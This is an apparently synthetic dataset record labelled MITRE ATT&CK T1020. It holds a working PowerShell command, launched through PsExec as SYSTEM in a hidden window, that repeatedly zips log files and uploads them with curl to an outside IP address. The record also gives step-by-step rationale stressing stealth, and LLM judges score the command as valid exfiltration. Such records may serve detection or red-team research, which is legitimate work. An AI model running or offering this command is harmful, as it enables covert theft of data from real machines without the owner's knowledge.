{
  "technique_id": "T1020",
  "platform": "Windows",
  "shell": "Powershell",
  "command": "psexec -accepteula -s -d powershell -NoProfile -WindowStyle Hidden -Command \"$ProgressPreference='SilentlyContinue'; $sent='C:\\ProgramData\\.sent'; New-Item -ItemType Directory -Path $sent -Force | Out-Null; while ($true){ $tmp=Join-Path $env:TEMP ('sys-' + (Get-Date -Format yyyyMMddHHmmss) + '.zip'); if (Test-Path 'C:\\ProgramData\\Diagnostics'){ Compress-Archive -Path 'C:\\ProgramData\\Diagnostics\\*.log' -DestinationPath $tmp -Force 2>$null; if (Test-Path $tmp){ curl -s -X POST -H 'Content-Type: application/zip' --data-binary @$tmp https://198.51.100.60/api/upload > $null 2>&1; if ($LASTEXITCODE -eq 0){ Move-Item -Force $tmp (Join-Path $sent ([IO.Path]::GetFileName($tmp))) } else { Remove-Item -Force $tmp } } }; Start-Sleep 600 }\"",
  "explanation": "Automates periodic packaging of diagnostic logs into a zip and posts them to an external HTTP endpoint using curl. Successfully sent bundles are archived to prevent re-sending.",
  "rationale_steps": [
    "Elevate and detach with PSExec to run stealthily as SYSTEM.",
    "Compress targeted logs into a timestamped archive for efficient transfer.",
    "Upload via HTTP POST with curl in silent mode and suppress outputs.",
    "Move or remove the archive based on transfer success to avoid duplicates.",
    "Repeat on a timer to maintain automated exfiltration."
  ],
  "obfuscation_level": "none",
  "id": "SYN-POWERSHELL-T1020-8bc12c8e-6f484c31",
  "source_prompt_hash": "8bc12c8e",
  "timestamp_utc": "2025-09-30T08:56:54.215628Z",
  "validation": {
    "syntax_ok": true,
    "llm_judgments": [
      {
        "model": "gpt-5",
        "syntactic_score": 5,
        "syntactic_justification": "The command is well-quoted and balanced, with valid PsExec options and PowerShell constructs, loops, conditionals, and redirections.",
        "semantic_score": 4,
        "semantic_justification": "It automates periodic packaging and HTTP exfiltration with retry/archiving behavior consistent with T1020, but it risks using PowerShellâ€™s curl alias instead of curl.exe and requires SYSTEM via PsExec despite the stated 'Privilege: None'.",
        "combined_score": 4.5,
        "confidence": 0.8,
        "timestamp": "2025-10-01T03:14:01.257506Z"
      },
      {
        "model": "claude-3-7-sonnet",
        "syntactic_score": 5,
        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, parentheses, and braces, proper command separators, valid flag formats, and appropriate escape sequences.",
        "semantic_score": 5,
        "semantic_justification": "The command fully implements automated exfiltration by using PsExec to launch a hidden PowerShell process that periodically compresses diagnostic logs, exfiltrates them via HTTP POST to an external server, and tracks successfully sent files.",
        "combined_score": 5.0,
        "confidence": 0.95,
        "timestamp": "2025-10-01T03:14:04.010966Z"
      },
      {
        "model": "gemini-2.0-flash-thinking-exp",
        "syntactic_score": 5,
        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, valid flags for psexec and powershell, and correct PowerShell cmdlet syntax and logic flow.",
        "semantic_score": 5,
        "semantic_justification": "The command perfectly achieves automated, periodic compression and exfiltration of diagnostic logs to an external endpoint, incorporating stealth and robust file management, making it highly plausible for T1020.",
        "combined_score": 5.0,
        "confidence": 1.0,
        "timestamp": "2025-10-01T05:40:36.427476Z"
      }
    ],
    "llm_average_syntactic": 5.0,
    "llm_average_semantic": 4.667,
    "llm_average_score": 4.833,
    "llm_verdict": "likely_match",
    "sandbox_trace_id": null,
    "mitre_match_score": null,
    "Syntax_Run_Details": ""
  }
}
